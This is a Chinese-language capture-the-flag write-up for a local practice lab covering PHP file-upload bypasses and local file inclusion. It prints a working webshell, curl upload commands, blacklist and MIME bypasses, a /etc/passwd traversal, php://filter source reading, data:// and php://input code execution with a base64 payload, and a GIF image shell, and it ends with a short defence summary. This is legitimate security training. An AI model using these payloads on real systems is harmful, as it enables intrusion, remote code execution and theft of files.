# 题解：upload-lfi 模块（up1~up4 / fi1~fi4）

> ⚠️ 请先把 8 道题全部做出来，再来看这里！

## up1 无过滤上传

```powershell
# ① 本地做 webshell（shell.php 内容：<?php system($_GET[1]); ?>）
curl.exe -F "f=@shell.php" http://localhost:8085/up1/
# ② 触发
curl.exe "http://localhost:8085/up1/uploads/shell.php?1=cat%20/flag_up1.txt"
```

**讲解**：move_uploaded_file 用原始文件名保存 → 扩展名完全可控 → .php 直接入站；上传目录在 web 根下、Apache 解析 php → 访问即执行。
**考点本质**：上传漏洞最小闭环 = **可控文件名 + 可访问 + 可执行**，三个条件缺一不可。后面每道题都是拆掉其中一个条件，绕过 = 把它补回来。

## up2 黑名单绕过

```powershell
# 解法一：大小写（黑名单检查没 strtolower）
curl.exe -F "f=@shell2.PhP" http://localhost:8085/up2/
curl.exe "http://localhost:8085/up2/uploads/shell2.PhP?1=cat%20/flag_up2.txt"
# 解法二：漏网扩展名（黑名单没列 .pht）
curl.exe -F "f=@shell.pht" http://localhost:8085/up2/
curl.exe "http://localhost:8085/up2/uploads/shell.pht?1=cat%20/flag_up2.txt"
```

**讲解**：黑名单拦 php/php3/php4/php5/phtml，但 ① in_array 大小写敏感 → .PhP 混过去；② 列表永远列不全 → .pht 没在名单里。靶场 Apache 配了多扩展名解析（(?i)\.(php|php3|php4|php5|phtml|pht)$ 都当 PHP），所以两种都能执行。
**考点本质**：黑名单 = 字符串匹配，扩展名 = 无限集合——**用有限名单拦无限集合必然有漏网**。和 si2b 大小写、xs5 换标签是同一个思想。

## up3 黑名单 + MIME 双重检查

```powershell
curl.exe -F "f=@shell.pht;type=image/jpeg" http://localhost:8085/up3/
curl.exe "http://localhost:8085/up3/uploads/shell.pht?1=cat%20/flag_up3.txt"
```

**讲解**：这题两层检查：① 扩展名黑名单 strtolower 了（大小写死了）→ 用 .pht（黑名单还是没列全）；② `$_FILES['f']['type']` 必须是 image/* —— 但这个值来自**请求头 Content-Type**，curl 的 `;type=image/jpeg` 一句话伪造。
**考点本质**：MIME 检查 = 检查客户端自己声明的东西 = **形同虚设**。呼应第 1 课 ch2 改头换面：请求头全部可伪造。

## fi1 任意文件包含（LFI）

```url
http://localhost:8085/fi1/?page=/flag_fi1.txt
http://localhost:8085/fi1/?page=../../../../../etc/passwd
```

**讲解**：`include($page)` 用户完全可控。include 非 PHP 文件 = 原样输出 → 变成"读任意文件"。/etc/passwd 是 Linux 万能试金石（存在且可读）。
**考点本质**：包含点的本质 = **让服务器替你打开一个你指定路径的文件**。读文件、执行代码、读源码都从这一个点出发。

## fi2 前后缀拼接突围

```url
http://localhost:8085/fi2/?page=../../../../../flag_fi2
```

**讲解**：`include('pages/' . $page . '.php')` —— 前缀用 `../` 消掉（5 层：pages→fi2→html→www→var→/）；后缀消不掉，但 flag 文件名叫 `/flag_fi2.php`，被拼上的 `.php` 正好是文件名的一部分——**后缀被吸收**。层数数错会收到 warning，里面印着解析后的完整路径——照着调就行（报错是导航）。
**考点本质**：拼接 = 给你加了"坐标系"——前缀用路径回溯消，后缀用文件名吸收。php://filter 在这里用不了（前缀把伪协议顶掉了）。

## fi3 php://filter 读源码

```url
http://localhost:8085/fi3/?page=php://filter/read=convert.base64-encode/resource=index.php
```

拿到 base64 串，解码后是 fi3/index.php 完整源码，注释里就是 flag。

**讲解**：flag 在本页源码注释里。直接 `?page=index.php` 是 include 自己——**执行**了一遍，注释被解析掉，什么都看不到。php://filter 把文件内容 base64 编码后输出——"读"而不"执行"。
**考点本质**：include 有两种模式——**执行**（.php 文件）和**读取**（非 .php 文件）。php://filter 是把任意文件强行切换到"读取"模式的开关。真实场景：读配置文件找数据库密码、读源码找二次漏洞。

## fi4 伪协议 RCE

```powershell
# 解法一：data://（把 base64 代码直接包含）
# <?php system("cat /flag_fi4.txt"); ?> 的 base64：
curl.exe "http://localhost:8085/fi4/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgL2ZsYWdfZmk0LnR4dCIpOyA/Pg=="

# 解法二：php://input（POST 体当代码）
curl.exe -s -X POST --data-binary "@input.php" "http://localhost:8085/fi4/?page=php://input"
```

**讲解**：容器 php.ini 开了 `allow_url_include=On`（真实环境默认关闭）。data:// 把 base64 解码后当代码执行——include 从"包含文件"升级成"执行任意代码"。php://input 把 POST 请求体当代码。base64 里的 `+ / =` 在 URL 里要编码（老朋友 `+` 又来了）。实测坑：PowerShell 里直接给 --data-binary 传带双引号的 payload，引号会被参数解析吃掉（报 Unclosed '('）——payload 写进文件用 `--data-binary @文件` 最稳。
**考点本质**：LFI 的终点站是 RCE。但前提 `allow_url_include=On` 是配置错误——**CTF 里见到裸 include 第一件事试伪协议，真实环境大多行不通**。

## up4 图片马 + 包含联动（L3 毕业考）

```powershell
# ① 做图片马（horse.gif 内容：GIF89a<?php system($_GET[1]); ?>）
curl.exe -F "f=@horse.gif" http://localhost:8085/up4/
# ② 查看器包含触发
curl.exe "http://localhost:8085/up4/?img=horse.gif&1=cat%20/flag_up4.php"
```

**讲解**：白名单 [jpg/jpeg/png/gif] + getimagesize 内容校验，扩展名和内容两关都死。突破口是页面上的**图片查看器**：它把用户传的文件名 include 进来渲染。GIF89a 是合法 GIF 头 → getimagesize 通过；查看器 include 这个 .gif → GIF89a 被当文本输出，后面的 `<?php ... ?>` 当代码执行 → RCE。查看器用了 basename() 防穿越，所以纯 ../ 绕不过去——**唯一路径就是上传图片马**。
**考点本质**：白名单防住了"传可执行文件"，但防不住"传内容带代码的合法图片"——图片马要配合**执行点**（包含/解析漏洞）才能变成 RCE。上传漏洞 + 包含漏洞，单独都是中危，**组合就是高危**。这是"两个漏洞组合"的第一个完整案例，真实 SRC 报告里也常这么写危害。

## 小结：两条危害链

```
上传链：无过滤 → 黑名单（漏网）→ MIME（伪造）→ 白名单+内容校验（图片马）
         每一层防御，对应一种绕过；绕过的尽头是组合拳

包含链：读文件（LFI）→ 读源码（php://filter）→ 执行代码（data:// / 包含图片马）
         包含点的三段式递进，终点都是 RCE

合体：上传（图片马）+ 包含（执行点）= RCE —— up4 就是这条完整链路
```

防御：上传白名单+随机重命名+目录禁执行；包含参数写死映射表；allow_url_include 永远关闭。

题目清单（8 题）：up1 无过滤 / up2 黑名单 / up3 MIME / up4 图片马毕业考 / fi1 穿越 / fi2 拼接 / fi3 filter / fi4 伪协议
